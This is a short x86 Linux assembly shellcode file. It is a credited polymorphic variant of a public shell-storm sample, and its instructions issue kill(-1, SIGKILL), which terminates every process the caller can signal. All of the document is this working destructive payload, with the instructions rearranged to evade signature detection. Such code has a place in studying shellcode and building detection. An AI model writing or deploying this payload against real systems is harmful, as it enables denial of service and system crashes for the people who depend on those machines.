; Author: Daniel Sauder
; website: govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/
; polymorphic version of:
; http://www.shell-storm.org/shellcode/files/shellcode-212.php

section .text

      global _start

_start:
; kill(-1, SIGKILL)

     xor ecx, ecx
     mul ecx
     mov al, byte 37
     dec ebx
     mov cl, byte 9
     int 0x80